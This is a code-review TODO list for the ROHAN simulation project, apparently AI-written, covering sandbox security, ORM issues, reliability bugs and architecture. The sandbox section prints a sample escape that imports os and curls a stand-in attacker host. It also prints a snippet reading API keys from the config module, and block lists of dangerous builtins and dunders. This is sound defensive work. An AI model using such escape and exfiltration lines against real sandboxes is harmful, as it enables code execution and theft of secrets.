# ROHAN — Architectural & Code Review: Production Hardening TODO

**Review date:** 2026-03-08
**Reviewer:** AI Engineering Review (full codebase audit)
**Scope:** Security, data integrity, reliability, architecture, test coverage
**Codebase version:** `main` @ commit HEAD

---

## How to use this document

Each finding is a self-contained item with:
- **Checkbox** — track completion (`- [ ]` / `- [x]`)
- **ID** — unique identifier (e.g. `SEC-1`)
- **Severity** — `CRITICAL` / `HIGH` / `MEDIUM` / `LOW`
- **Location** — exact file and line numbers
- **What's wrong** — description of the current behavior
- **Evidence** — code snippet proving the issue
- **Proposed fix** — concrete code or approach to resolve it
- **Verification** — how to confirm the fix works

Items are organized into 5 workstreams, ordered by blast radius.

---

## Workstream 1 — Security: Sandbox Escape (CRITICAL)

The strategy validator (`src/rohan/simulation/strategy_validator.py`) executes
LLM-generated Python code in a restricted namespace. Three flaws combine into
a **full sandbox escape chain** that allows arbitrary code execution and
secret exfiltration.

### - [ ] SEC-1: `__import__` in SAFE_BUILTINS bypasses the import whitelist (CRITICAL)

**Location:** `src/rohan/simulation/strategy_validator.py`, line 62

**What's wrong:** The `SAFE_BUILTINS` set includes `"__import__"`. This builtin
function is made available to all LLM-generated code via the restricted `exec()`
namespace. The AST validator only checks `ast.Import` and `ast.ImportFrom` nodes
(lines 73-76), so it cannot catch `__import__()` *function calls*. This means
any LLM-generated strategy can import arbitrary modules at runtime:

```python
# LLM-generated strategy code — bypasses AST import whitelist
os = __import__('os')
os.system('curl http://attacker.com/steal')
```

**Evidence — current code (line 53-62):**
```python
SAFE_BUILTINS = {
    "abs", "all", "any", "bool", "dict", "float", "int", "len",
    "list", "max", "min", "pow", "range", "round", "set", "str",
    "sum", "tuple", "zip", "enumerate", "filter", "map", "sorted",
    "reversed", "isinstance", "print",
    "__build_class__",  # Required for class definitions
    "super",            # Required for inheritance
    "__import__",       # Required for import statements  ← THE BUG
}
```

The comment says "Required for import statements", but `import foo` statements
in exec'd code work via the `__builtins__` dict — they don't require
`__import__` to be explicitly listed. Python's `import` statement calls
`__builtins__.__import__` which is always available when `__builtins__` is a
dict containing it. However, **listing `__import__` in SAFE_BUILTINS also makes
it callable as a function**, which the AST check does not intercept.

**Proposed fix:** Remove `__import__` from `SAFE_BUILTINS`. Provide a custom
`_safe_import` wrapper that enforces the whitelist and inject it as the
`__import__` key in the builtins dict passed to `exec()`:

```python
def _make_safe_import(allowed: set[str]):
    """Return a __import__ replacement that enforces the module whitelist."""
    _real_import = builtins.__import__

    def _safe_import(name: str, *args, **kwargs):
        root = name.split(".")[0]
        if root not in allowed and name not in allowed:
            raise ImportError(
                f"Import of {name!r} is not allowed. "
                f"Permitted modules: {sorted(allowed)}"
            )
        return _real_import(name, *args, **kwargs)

    return _safe_import
```

Then in `execute_strategy()`, where the builtins dict is built:
```python
safe_builtins_dict = {name: getattr(builtins, name) for name in self.SAFE_BUILTINS}
safe_builtins_dict["__import__"] = _make_safe_import(self.SAFE_IMPORTS)
```

**Verification:**
1. Write a test where strategy code calls `__import__('os')` → assert `ImportError` is raised.
2. Write a test where strategy code calls `__import__('numpy')` → assert it succeeds.
3. Write a test where strategy code does `from math import sqrt` → assert it succeeds.


### - [ ] SEC-2: `rohan.config` in SAFE_IMPORTS exposes API keys (CRITICAL)

**Location:** `src/rohan/simulation/strategy_validator.py`, line 29

**What's wrong:** The import whitelist includes `"rohan.config"`.
`src/rohan/config/__init__.py` re-exports `LLMSettings` and `SecretSettings`.
Combined with SEC-1, LLM-generated code can read API keys:

```python
# LLM strategy code
from rohan.config import LLMSettings
key = LLMSettings().openrouter_api_key.get_secret_value()
# With __import__('os') from SEC-1, this key can be exfiltrated
```

**Evidence — current config exports (`src/rohan/config/__init__.py`, lines 1-28):**
```python
from .llm_settings import LLMProvider, LLMSettings
from .secrets_settings import SecretSettings
# ...
__all__ = [
    "SecretSettings",
    "LLMSettings",
    # ...
]
```

**Proposed fix:** Remove `"rohan.config"` from `SAFE_IMPORTS`. Strategy code
only needs `SimulationSettings` values, not LLM keys. If strategy code
needs simulation parameters, inject them into the exec namespace directly:

```python
SAFE_IMPORTS = {
    "math", "random", "statistics", "numpy", "pandas",
    "datetime", "typing",
    "rohan.simulation.models.strategy_api",
    # "rohan.config" ← REMOVED
}
```

If strategies need specific config values (e.g., ticker, date), inject a
read-only dataclass into the namespace instead:

```python
@dataclass(frozen=True)
class SandboxConfig:
    ticker: str
    date: str
    starting_cash: int
```

**Verification:**
1. Test that `from rohan.config import LLMSettings` raises `ImportError` in sandbox.
2. Test that `from rohan.simulation.models.strategy_api import StrategicAgent` still works.
3. Ensure no existing LLM-generated strategies import from `rohan.config`.


### - [ ] SEC-3: ThreadPoolExecutor timeout blocks forever on stuck threads (CRITICAL)

**Location:** `src/rohan/simulation/strategy_validator.py`, lines 296-307

**What's wrong:** `execute_strategy_safely()` uses `with ThreadPoolExecutor` as
a context manager. When the `future.result(timeout=...)` raises `TimeoutError`,
the exception propagates out of the `with` block.
`ThreadPoolExecutor.__exit__` calls `self.shutdown(wait=True)`, which joins all
worker threads. **If the simulation thread is stuck in an infinite loop,
`shutdown(wait=True)` blocks the caller forever**, negating the timeout entirely.

**Evidence — current code (lines 296-307):**
```python
with ThreadPoolExecutor(max_workers=1) as executor:
    future: Future[SimulationResult] = executor.submit(
        _run_simulation_in_thread, strategy_code, settings
    )
    try:
        return future.result(timeout=timeout_seconds)
    except TimeoutError:
        elapsed = time.monotonic() - start_time
        raise SimulationTimeoutError(...) from None
```

The code's own comments (lines 277-294) acknowledge this limitation: *"Thread-based
timeout cannot forcibly kill a runaway thread"*. But the `with` block makes it
worse by blocking the caller in `__exit__` even after timeout fires.

**Proposed fix:** Don't use the context manager. Manage the executor manually
and call `shutdown(wait=False, cancel_futures=True)`:

```python
executor = ThreadPoolExecutor(max_workers=1)
future: Future[SimulationResult] = executor.submit(
    _run_simulation_in_thread, strategy_code, settings
)
try:
    return future.result(timeout=timeout_seconds)
except TimeoutError:
    # Don't wait for the stuck thread — abandon it
    executor.shutdown(wait=False, cancel_futures=True)
    elapsed = time.monotonic() - start_time
    raise SimulationTimeoutError(
        f"Strategy execution timed out after {elapsed:.1f}s "
        f"(limit: {timeout_seconds}s)."
    ) from None
except Exception as exc:
    executor.shutdown(wait=False)
    raise StrategyExecutionError(f"Strategy execution failed: {exc}") from exc
```

**Verification:**
1. Write a test with a strategy containing `while True: pass` and a 2-second
   timeout. Assert that `SimulationTimeoutError` is raised within 5 seconds
   (not hanging forever).
2. Confirm that the main thread is not blocked by the stuck worker thread.


### - [ ] SEC-4: No protection against `eval()`/`exec()`/`compile()` in strategy code (HIGH)

**Location:** `src/rohan/simulation/strategy_validator.py`, lines 33-62

**What's wrong:** `eval`, `exec`, and `compile` are not in `SAFE_BUILTINS`, so
they're not directly available. However, if `__import__` is still accessible
(SEC-1), they can be obtained indirectly. Even after fixing SEC-1, a
defense-in-depth approach should explicitly block these in the AST checker.

**Proposed fix:** Add AST-level checks for calls to known-dangerous builtins:

```python
FORBIDDEN_CALLS = {"eval", "exec", "compile", "globals", "locals", "vars",
                   "getattr", "setattr", "delattr", "breakpoint"}

for node in ast.walk(tree):
    if isinstance(node, ast.Call):
        if isinstance(node.func, ast.Name) and node.func.id in FORBIDDEN_CALLS:
            errors.append(f"Call to '{node.func.id}()' is forbidden")
```

**Verification:** Test that strategy code containing `eval("1+1")` is rejected
by the validator.


### - [ ] SEC-5: Dunder attribute block is overly broad — blocks `super().__init__()` (HIGH)

**Location:** `src/rohan/simulation/strategy_validator.py`, lines 77-78

**What's wrong:** The AST check rejects ALL attribute access to names starting
with `__`:
```python
elif isinstance(node, ast.Attribute) and node.attr.startswith("__"):
    errors.append(f"Access to private attribute '{node.attr}' is restricted")
```

This blocks legitimate patterns like `super().__init__()` (accesses `__init__`),
`type(x).__name__`, and `exception.__class__`. These are commonly generated by
LLMs writing class-based strategies.

**Proposed fix:** Maintain a denylist of truly dangerous dunders instead of
blocking all:

```python
DANGEROUS_DUNDERS = {
    "__builtins__", "__globals__", "__code__", "__subclasses__",
    "__bases__", "__mro__", "__import__", "__loader__", "__spec__",
}

elif isinstance(node, ast.Attribute) and node.attr in DANGEROUS_DUNDERS:
    errors.append(f"Access to '{node.attr}' is restricted")
```

**Verification:**
1. Test that `super().__init__()` is allowed.
2. Test that `obj.__globals__` is still rejected.
3. Test that `obj.__builtins__` is still rejected.

---

## Workstream 2 — Data Integrity & Database Layer (HIGH)

### - [ ] DB-1: Mutable default arguments in ORM column definitions (HIGH)

**Location:** `src/rohan/framework/database/models.py`, lines 81, 207

**What's wrong:** Two columns use mutable defaults:
```python
# Line 81
config_override: Mapped[dict[str, Any]] = mapped_column(JSON, nullable=False, default={})

# Line 207
progress_log: Mapped[dict[str, Any]] = mapped_column(JSON, nullable=False, default=[])
```

Using `{}` or `[]` as a class-level default means all ORM instances share the
same object. While SQLAlchemy's `mapped_column` may defensively copy these in
most cases, this is a well-known Python footgun and violates best practices.

**Proposed fix:** Use a callable default:
```python
config_override: Mapped[dict[str, Any]] = mapped_column(
    JSON, nullable=False, default=dict
)
progress_log: Mapped[dict[str, Any]] = mapped_column(
    JSON, nullable=False, default=list
)
```

**Verification:** Create two `SimulationScenario` instances without setting
`config_override`. Mutate one and verify the other is unaffected.


### - [ ] DB-2: Detached ORM objects from session lifecycle pattern (HIGH)

**Location:** `src/rohan/framework/repository.py` (throughout),
`src/rohan/framework/refinement_repository.py` (throughout),
`src/rohan/framework/scenario_repository.py` (throughout)

**What's wrong:** All three repositories use this pattern:
```python
def get_run(self, run_id: UUID) -> SimulationRun | None:
    session = self.db.get_session()
    try:
        result = session.execute(select(SimulationRun).where(...))
        return result.scalar_one_or_none()
    finally:
        self.db.remove_session()  # ← object is now detached
```

The returned ORM object is **detached** from the session. Any subsequent access
to lazy-loaded relationships (e.g., `run.market_data`, `run.logs`) will raise
`sqlalchemy.orm.exc.DetachedInstanceError`.

**Proposed fix:** Introduce a `BaseRepository` with a context-manager session
pattern:

```python
class BaseRepository:
    def __init__(self, db: DatabaseConnector) -> None:
        self.db = db

    @contextmanager
    def _session(self):
        session = self.db.get_session()
        try:
            yield session
        except Exception:
            session.rollback()
            raise
        finally:
            self.db.remove_session()
```

Then repositories use:
```python
def get_run(self, run_id: UUID) -> SimulationRun | None:
    with self._session() as session:
        result = session.execute(
            select(SimulationRun)
            .options(selectinload(SimulationRun.market_data))
            .where(SimulationRun.run_id == run_id)
        )
        return result.scalar_one_or_none()
```

For read-only operations that return detached objects, use `session.expunge(obj)`
after eagerly loading all needed data.

**Verification:** Write a test that retrieves a `SimulationRun` and accesses
`.market_data` — should not raise `DetachedInstanceError`.


### - [ ] DB-3: N+1 queries in `list_sessions()` and `load_session()` (HIGH)

**Location:** `src/rohan/framework/refinement_repository.py`, lines 218-230 and 238-270

**What's wrong:**

In `list_sessions()` (line 224):
```python
iteration_count=len(r.iterations),  # ← triggers lazy load for EACH row
```

In `load_session()`, nested iteration over `session_obj.iterations` →
`it_orm.scenario_results` triggers two levels of lazy loading.

With 50 sessions, `list_sessions()` fires 51 queries (1 + 50 lazy loads).

**Proposed fix:** Use eager loading:
```python
# list_sessions
result = db_session.execute(
    select(RefinementSession)
    .options(selectinload(RefinementSession.iterations))
    .order_by(RefinementSession.created_at.desc())
)

# load_session — use nested eager loading
session_obj = db_session.execute(
    select(RefinementSession)
    .options(
        selectinload(RefinementSession.iterations)
        .selectinload(RefinementIteration.scenario_results)
        .selectinload(RefinementScenarioResult.artifacts)
    )
    .where(RefinementSession.session_id == session_id)
).scalar_one_or_none()
```

Alternatively, for `list_sessions()`, use a subquery count instead of loading
all iterations:

```python
from sqlalchemy import func, select

iter_count = (
    select(func.count(RefinementIteration.iteration_id))
    .where(RefinementIteration.session_id == RefinementSession.session_id)
    .correlate(RefinementSession)
    .scalar_subquery()
)
```

**Verification:** Enable SQLAlchemy echo logging (`echo=True`) and verify that
`list_sessions()` fires exactly 2 queries (1 sessions + 1 batch iterations),
not 1+N.


### - [ ] DB-4: `save_market_data` forward-fills NaN prices, contradicting analysis invariant (HIGH)

**Location:** `src/rohan/framework/repository.py`, lines 77-80

**What's wrong:**
```python
data["bid_price"] = data["bid_price"].ffill().bfill()
data["ask_price"] = data["ask_price"].ffill().bfill()
```

The `AnalysisService` docstring explicitly states: *"We therefore never
forward-fill prices."* But `save_market_data` applies `ffill().bfill()` before
persisting. This erases NaN gaps that represent illiquidity events — a key
signal for strategy analysis.

When this data is later loaded and analyzed, the NaN events have been silently
fabricated with stale prices, making analysis unreliable.

**Proposed fix:** Remove the forward-fill on prices. Only fill quantities
(where 0 is a reasonable default for missing data):

```python
# Keep NaN prices as-is — they signal illiquidity events
data["bid_qty"] = data["bid_qty"].fillna(0).astype(int)
data["ask_qty"] = data["ask_qty"].fillna(0).astype(int)
data = data.dropna(subset=["bid_price", "ask_price"])  # keep this — removes fully empty rows
```

**Verification:** Save a DataFrame with intentional NaN bid prices, load it
back, and verify the NaNs are preserved.


### - [ ] DB-5: No database migration framework (MEDIUM)

**Location:** `src/rohan/framework/database/init_db.py`

**What's wrong:** The project only uses `Base.metadata.create_all()` for schema
creation and `reset_database()` (destructive drop+recreate) for changes.
There is no migration tool configured. When the ORM models change, the only
options are: (a) drop all data, or (b) manually ALTER tables.

There's already a deprecated column (`impact_score` at
`src/rohan/framework/database/models.py`, line 241) with no removal plan.

**Proposed fix:**
1. Install Alembic: `uv add alembic --group dev`
2. Initialize: `alembic init alembic`
3. Generate initial migration: `alembic revision --autogenerate -m "initial_schema"`
4. Add a migration to remove `impact_score`
5. Add `alembic upgrade head` to the app startup (replace `create_all()`)

**Verification:** Run `alembic upgrade head` on a fresh database. Run
`alembic downgrade -1` and `alembic upgrade head` to verify reversibility.


### - [ ] DB-6: `SecretSettings` class is redundant and broken (MEDIUM)

**Location:** `src/rohan/config/secrets_settings.py`, lines 1-10

**What's wrong:**
```python
class SecretSettings(BaseSettings):
    model_config = SettingsConfigDict(secrets_dir="/run/secrets")
    openrouter_api_key: SecretStr
```

Three problems:
1. `openrouter_api_key` is required with no default — crashes when
   `/run/secrets/openrouter_api_key` doesn't exist (every non-Docker env).
2. Hardcoded Unix path `/run/secrets` will never work on Windows (the dev OS).
3. `LLMSettings` already manages the same key via `SecretStr` + env var.

This class creates two conflicting sources of truth for the same secret.

**Proposed fix:** Remove `SecretSettings` entirely. Remove it from
`src/rohan/config/__init__.py` exports. `LLMSettings` already handles API key
management correctly via `SecretStr` and env vars.

**Verification:** Grep for `SecretSettings` across the codebase and verify no
imports remain. Run the full test suite.


### - [ ] DB-7: Type annotation mismatches in ORM models (MEDIUM)

**Location:** `src/rohan/framework/database/models.py`, lines 78, 204, 207

**What's wrong:**
```python
# Line 78 — should be Mapped[uuid.UUID | None], not Mapped[StrategySession | None]
session_id: Mapped[StrategySession | None] = mapped_column(
    ForeignKey("strategy_sessions.session_id", ondelete="CASCADE"), nullable=True
)

# Line 204 — annotated as dict but actually holds list[ScenarioConfig] serialized
scenario_configs: Mapped[dict[str, Any]] = mapped_column(JSON, ...)

# Line 207 — annotated as dict but actually holds list[str]
progress_log: Mapped[dict[str, Any]] = mapped_column(JSON, nullable=False, default=[])
```

These misleading type annotations confuse type checkers and developers.

**Proposed fix:**
```python
session_id: Mapped[uuid.UUID | None] = ...
scenario_configs: Mapped[list[dict[str, Any]]] = ...
progress_log: Mapped[list[str]] = ...
```

**Verification:** Run pyright / mypy and verify no type errors on these fields.


### - [ ] DB-8: `DatabaseSettings.connection_string` should use `SecretStr` (LOW)

**Location:** `src/rohan/config/database_settings.py`, line 8

**What's wrong:** Connection strings may contain credentials
(`postgresql://user:password@host/db`). Using plain `str` means credentials
appear in logs, stack traces, `repr()`, and Pydantic's `model_dump()`.

**Proposed fix:**
```python
from pydantic import SecretStr
connection_string: SecretStr = Field(
    default=SecretStr("sqlite:///./rohan.db"), ...
)
```

Update `DatabaseConnector.__init__` to use
`settings.connection_string.get_secret_value()`.

**Verification:** Print `DatabaseSettings()` and verify the connection string
is masked as `SecretStr('**********')`.


### - [ ] DB-9: Database connection string partially logged (LOW)

**Location:** `src/rohan/framework/database/database_connector.py`, lines 49-52

**What's wrong:**
```python
logger.info(
    "Database connector initialised: %s",
    settings.connection_string.split("@")[-1]
    if "@" in settings.connection_string
    else settings.connection_string,
)
```

For connection strings without `@` (e.g., SQLite), the **full string** is
logged. For URLs with query-parameter passwords (`?password=xxx`), credentials
leak. This becomes a non-issue if DB-8 is implemented with `SecretStr`.

**Verification:** After implementing DB-8, verify the log line shows the masked
representation.


### - [ ] DB-10: No composite index on `strategy_iterations(session_id, generation_number)` (LOW)

**Location:** `src/rohan/framework/database/models.py`, around line 97

**What's wrong:** Queries filtering by `session_id + generation_number` (common
in the refinement flow) only have a FK index on `session_id`. Adding a composite
index improves query performance for the most common access pattern.

**Proposed fix:** Add to the `StrategyIteration` class:
```python
__table_args__ = (
    Index("ix_strategy_iterations_session_gen", "session_id", "generation_number"),
)
```

**Verification:** Run `EXPLAIN SELECT ...` on a filtered query and verify the
index is used.

---

## Workstream 3 — Reliability & Correctness (HIGH-MEDIUM)

### - [ ] REL-1: Matplotlib figure memory leak in chart generation (HIGH)

**Location:** `src/rohan/llm/nodes.py`, lines 414-470 (6 chart blocks);
`src/rohan/framework/analysis_service.py` (all `plot_*` methods)

**What's wrong:** Six `analyzer.plot_*()` calls create matplotlib `Figure`
objects that are **never closed**. Only `figure_to_base64` (or `figure_to_bytes`)
calls `plt.close(fig)`, but if an exception occurs between figure creation and
base64 encoding, the figure leaks.

With 3 scenarios × 5 iterations × 6 charts = **90 leaked figures**, consuming
hundreds of MB.

**Evidence (lines 414-420):**
```python
try:
    fig = analyzer.plot_price_series(strategy_output, ...)
    price_chart_b64 = analyzer.figure_to_base64(fig)
    # fig is only closed inside figure_to_base64
except Exception:
    logger.debug("Price chart generation failed for %r", ...)
    # fig leaked on exception!
```

**Proposed fix:** Use a context manager pattern or add explicit `plt.close(fig)`
in a `finally` block:

```python
try:
    fig = analyzer.plot_price_series(strategy_output, ...)
    price_chart_b64 = analyzer.figure_to_base64(fig)
except Exception:
    logger.debug(...)
finally:
    if 'fig' in dir() and fig is not None:
        plt.close(fig)
```

Or better — have each `plot_*` method return a bytes/base64 directly, closing
the figure internally.

**Verification:** Run a 5-iteration refinement and monitor process memory.
Alternatively, add `import gc; gc.collect()` and check that
`plt.get_fignums()` is empty after each scenario.


### - [ ] REL-2: `get_structured_model` silently discards LLM parse errors (HIGH)

**Location:** `src/rohan/llm/factory.py`, lines 176-178

**What's wrong:**
```python
raw_runnable = model.with_structured_output(
    schema, method="function_calling", include_raw=True
)
return raw_runnable.pipe(lambda x: x.get("parsed"))  # error detail lost
```

When the LLM returns malformed output, `x["parsing_error"]` contains the actual
error, but it's silently discarded. Callers receive `None` with zero diagnostic
information, making parse failures extremely hard to debug.

**Proposed fix:**
```python
def _extract_or_log(x: dict) -> T | None:
    if x.get("parsed") is not None:
        return x["parsed"]
    logger.warning(
        "Structured output parse failure for %s: %s",
        schema.__name__,
        x.get("parsing_error", "unknown error"),
    )
    return None

return raw_runnable.pipe(_extract_or_log)
```

**Verification:** Force a parse failure (e.g., with a mock LLM returning
garbage JSON) and verify the warning is logged.


### - [ ] REL-3: `_pct_change` returns `float("inf")` which propagates to LLM prompts (HIGH)

**Location:** `src/rohan/simulation/utils.py`, lines 40-43

**What's wrong:**
```python
if b == 0:
    return 0.0 if a == 0 else float("inf")
```

`float("inf")` flows through to `ScenarioResult.volatility_delta_pct` etc.,
then into `format_interpreter_prompt()`, then into the LLM prompt as `"inf%"`.
This confuses the writer model and produces nonsensical reasoning about
"infinite" impact.

**Proposed fix:** Cap at a reasonable maximum:
```python
if b == 0:
    return 0.0 if a == 0 else None  # undefined when baseline is zero
```

Or if a numeric value is needed:
```python
if b == 0:
    return 0.0 if a == 0 else 10.0  # cap at +1000%
```

**Verification:** Test that `_pct_change(5.0, 0.0)` returns `None` (or the
capped value), not `float("inf")`.


### - [ ] REL-4: Hardcoded agent ID `1` in `run_with_baseline` (HIGH)

**Location:** `src/rohan/simulation/utils.py`, line 60

**What's wrong:**
```python
metrics1 = AnalysisService.compute_agent_metrics(res1.result, 1)
```

The strategic agent ID is hardcoded as `1`. The correct approach (used in
`nodes.py` line 370) is `res1.result.strategic_agent_id`. If agent ordering
changes (e.g., with adversarial scenarios that modify agent population), this
will compute metrics for the wrong agent.

**Proposed fix:**
```python
metrics1 = AnalysisService.compute_agent_metrics(
    res1.result,
    res1.result.strategic_agent_id,
    initial_cash=settings.starting_cash,
)
```

**Verification:** Run `run_with_baseline` with the actual simulation and verify
returned metrics match those from `nodes.py`.


### - [ ] REL-5: Missing `explanations` key in error return path (MEDIUM)

**Location:** `src/rohan/llm/nodes.py`, lines 496-504

**What's wrong:**
```python
except Exception as exc:
    return {
        "scenario_results": [
            ScenarioResult(scenario_name=scenario.name, error=...)
        ]
        # ← 'explanations' key is MISSING
    }
```

Compare with the normal return path (lines 492-493):
```python
return {"scenario_results": [result], "explanations": [explanation]}
```

When this error path is taken, `explanations` is not returned. The
`_concat_or_clear` reducer won't be triggered for the `explanations` channel,
and stale explanations from a previous iteration could bleed through.

**Proposed fix:**
```python
except Exception as exc:
    error_result = ScenarioResult(
        scenario_name=scenario.name,
        error=f"{exc}\n{traceback.format_exc()}",
    )
    return {
        "scenario_results": [error_result],
        "explanations": [_error_explanation(scenario.name, str(exc))],
    }
```

**Verification:** Trigger an exception in `process_scenario_node` (e.g., with
a deliberately failing strategy) and verify that `state["explanations"]`
contains the error explanation, not stale data.


### - [ ] REL-6: `LatencyType` enum has accidental tuple values (MEDIUM)

**Location:** `src/rohan/config/latency_settings.py`, lines 10-12

**What's wrong:**
```python
class LatencyType(str, Enum):
    NO_LATENCY = ("no_latency",)     # ← tuple, NOT string
    DETERMINISTIC = ("deterministic",)  # ← tuple, NOT string
    CUBIC = "cubic"                     # ← string (correct)
```

Trailing commas create 1-element tuples. `LatencyType.NO_LATENCY.value` returns
`("no_latency",)`, not `"no_latency"`. Since `LatencyType` inherits from `str`,
Python's `str(LatencyType.NO_LATENCY)` still works via the enum name, but
`.value` comparisons will silently fail.

**Proposed fix:** Remove the trailing commas:
```python
class LatencyType(str, Enum):
    NO_LATENCY = "no_latency"
    DETERMINISTIC = "deterministic"
    CUBIC = "cubic"
```

**Verification:** Assert `LatencyType.NO_LATENCY.value == "no_latency"` and
`isinstance(LatencyType.NO_LATENCY.value, str)`.


### - [ ] REL-7: Dead delta-display logic in Terminal UI (`prev = None`) (MEDIUM)

**Location:** `src/rohan/ui/0_Terminal.py`, line 1027 and line 1153

**What's wrong:**
```python
prev = None
# ... later:
d = metric_delta(metrics.volatility, prev.volatility if prev else None)
```

`prev` is always `None`, so all metric deltas are `None` and never displayed.
The session state storing `previous_metrics` (line 936) is never read at the
render points.

**Proposed fix:**
```python
prev = st.session_state.get("previous_metrics")
```

**Verification:** Run two consecutive simulations. The second one should display
delta arrows (▲/▼) comparing to the first.


### - [ ] REL-8: Silent DB initialization failure in UI (MEDIUM)

**Location:** `src/rohan/ui/0_Terminal.py`, lines 40-43;
`src/rohan/ui/pages/1_Refinement_Lab.py`, lines 63-65

**What's wrong:**
```python
with contextlib.suppress(Exception):  # catches ALL exceptions
    initialize_database()
```

This suppresses **every** exception type, including `TypeError`,
`PermissionError`, `OSError`, and even `MemoryError`. If the DB connection
string is wrong, the app silently continues and crashes later with confusing
errors.

**Proposed fix:** Narrow the suppression and log:
```python
try:
    initialize_database()
except Exception:
    logger.warning("Database initialization failed — persistence disabled", exc_info=True)
```

Or narrow to expected exceptions:
```python
from sqlalchemy.exc import OperationalError
with contextlib.suppress(OperationalError):
    initialize_database()
```

**Verification:** Set an invalid `DB_CONNECTION_STRING` env var and verify that
a warning is logged (not silently suppressed).


### - [ ] REL-9: Chart generation failures logged at DEBUG level only (LOW)

**Location:** `src/rohan/llm/nodes.py`, lines 416-450

**What's wrong:**
```python
except Exception:
    logger.debug("Price chart generation failed for %r", scenario.name, exc_info=True)
```

If chart generation consistently fails (e.g., missing matplotlib backend), it
will be invisible at the default INFO log level. Charts will silently be `None`
for all scenarios.

**Proposed fix:** Log at WARNING level:
```python
except Exception:
    logger.warning("Price chart generation failed for %r", scenario.name, exc_info=True)
```

**Verification:** Cause a chart failure and verify it appears in INFO-level logs.


### - [ ] REL-10: `datetime.now()` without timezone in `IterationSummary` (LOW)

**Location:** `src/rohan/llm/models.py`, line 126

**What's wrong:**
```python
timestamp: datetime = Field(default_factory=datetime.now)
```

Uses local time, which is ambiguous across time zones. When comparing timestamps
from different machines or after a DST change, ordering can be wrong.

**Proposed fix:**
```python
from datetime import datetime, timezone
timestamp: datetime = Field(default_factory=lambda: datetime.now(timezone.utc))
```

**Verification:** Create an `IterationSummary` and verify its `timestamp.tzinfo`
is not `None`.


### - [ ] REL-11: Hardcoded `timeout_seconds=300` in three locations (LOW)

**Location:**
- `src/rohan/simulation/strategy_validator.py`, line 263 (default parameter)
- `src/rohan/llm/nodes.py`, line 354
- `src/rohan/simulation/utils.py`, line 50 (default parameter)

**What's wrong:** The simulation timeout is hardcoded as `300` in three
independent files. Changing it requires updating all three places.

**Proposed fix:** Add a `timeout_seconds` field to `SimulationSettings`:
```python
timeout_seconds: int = Field(default=300, ge=10, le=3600, description="...")
```

Then reference `settings.timeout_seconds` everywhere.

**Verification:** Set timeout to 60 via env var, run a simulation, and verify
the timeout is 60 seconds (not 300).

---

## Workstream 4 — Architecture & Maintainability (MEDIUM)

### - [ ] ARCH-1: God class `AnalysisService` — 1622 lines, 20+ static methods (MEDIUM)

**Location:** `src/rohan/framework/analysis_service.py`

**What's wrong:** `AnalysisService` combines market metrics, agent metrics, risk
computation, fill parsing, VPIN, resilience, rich analysis, 6 chart types,
base64 encoding, and summary generation in a single 1622-line file. Every method
is `@staticmethod`, making it a namespace of loose functions — not a real class.

This violates Single Responsibility and makes the file difficult to navigate,
test, and extend. When adversarial scenarios add new metrics (Phase B), this
file will grow further.

**Proposed fix:** Decompose into focused modules:
```
src/rohan/framework/
├── analysis/
│   ├── __init__.py            # re-exports for backward compat
│   ├── market_metrics.py      # compute_metrics(), L1 aggregation
│   ├── agent_metrics.py       # compute_agent_metrics(), fill parsing
│   ├── rich_analysis.py       # compute_rich_analysis(), RichAnalysisBundle
│   ├── charts.py              # all plot_* methods + figure_to_base64/bytes
│   └── summary.py             # generate_summary()
```

Since all methods are `@staticmethod`, this is a low-risk mechanical refactor.
The `analysis_service.py` module can re-export everything for backward
compatibility.

**Verification:** Run the full test suite after refactoring — all existing tests
should pass with zero changes.


### - [ ] ARCH-2: DRY violation — `process_scenario_node` duplicates `run_with_baseline` (MEDIUM)

**Location:** `src/rohan/llm/nodes.py`, lines 335-492 vs
`src/rohan/simulation/utils.py`, lines 47-99

**What's wrong:** Both files implement the same strategy-vs-baseline comparison
pipeline: run strategy → run baseline → compute `_to_market_metrics` → compute
`MarketImpact` → build `ComparisonResult`. Any change to the comparison logic
must be made in two places.

**Proposed fix:** Have `process_scenario_node` delegate to `run_with_baseline`
(or a shared service method) for the simulation+comparison part. The node would
handle only the chart generation, rich analysis, and state updates.

**Verification:** After refactoring, run `test_llm_nodes.py` and verify that all
existing mocked tests still pass. Verify that `run_with_baseline` is the single
implementation.


### - [ ] ARCH-3: Circular import — `graph.py` ↔ `nodes.py` (MEDIUM)

**Location:** `src/rohan/llm/nodes.py`, line 953

**What's wrong:**
```python
# Inside aggregator_node():
from rohan.llm.graph import DEFAULT_MAX_ITERATIONS
```

This function-level import exists to break a circular dependency between
`graph.py` (which imports nodes) and `nodes.py` (which needs the constant from
`graph.py`). This is a design smell and fragile — a top-level import would cause
an `ImportError`.

**Proposed fix:** Move `DEFAULT_MAX_ITERATIONS` and
`DEFAULT_CONVERGENCE_THRESHOLD` to `src/rohan/llm/state.py` or a new
`src/rohan/llm/constants.py`. Both `graph.py` and `nodes.py` import from this
shared module.

**Verification:** Verify import succeeds at module level. Run `test_llm_graph.py`
and `test_llm_nodes.py`.


### - [ ] ARCH-4: Environment variable mutation at module import time (MEDIUM)

**Location:** `src/rohan/llm/graph.py`, lines 55-56

**What's wrong:**
```python
if "LANGCHAIN_TRACING_V2" not in os.environ:
    os.environ["LANGCHAIN_TRACING_V2"] = "false"
```

This is a module-level side effect. Any module that imports from
`rohan.llm.graph` silently disables LangSmith tracing for the entire process,
even if the caller intended to enable it later.

**Proposed fix:** Move this into `build_refinement_graph()` or
`run_refinement()`:
```python
def build_refinement_graph(...):
    if "LANGCHAIN_TRACING_V2" not in os.environ:
        os.environ["LANGCHAIN_TRACING_V2"] = "false"
    # ...
```

**Verification:** Import `rohan.llm.graph` and verify that
`os.environ.get("LANGCHAIN_TRACING_V2")` is unchanged.


### - [ ] ARCH-5: `lru_cache` on `_cached_settings` prevents runtime config updates (MEDIUM)

**Location:** `src/rohan/llm/factory.py`, lines 130-133

**What's wrong:**
```python
@lru_cache(maxsize=8)
def _cached_settings() -> LLMSettings:
    from rohan.config.llm_settings import LLMSettings
    return LLMSettings()
```

`LLMSettings()` reads from environment variables at construction time. Once
cached, the settings are frozen for the process lifetime. If environment
variables change (e.g., rotating API keys, switching models), the stale config
is used.

The `maxsize=8` is misleading — a zero-argument function only ever produces one
cache entry, regardless of `maxsize`.

**Proposed fix:** Either:
1. Use `maxsize=1` for clarity and document the caching behavior
2. Accept a `settings` parameter on the public functions (already partially done
   with the `settings: LLMSettings | None = None` pattern) and remove the cache
3. Use a time-bounded cache with `cachetools.TTLCache`

**Verification:** Clear the cache, change an env var, call the function, and
verify the new value is used.


### - [ ] ARCH-6: Monolithic UI files — 1812 and 1366 lines (MEDIUM)

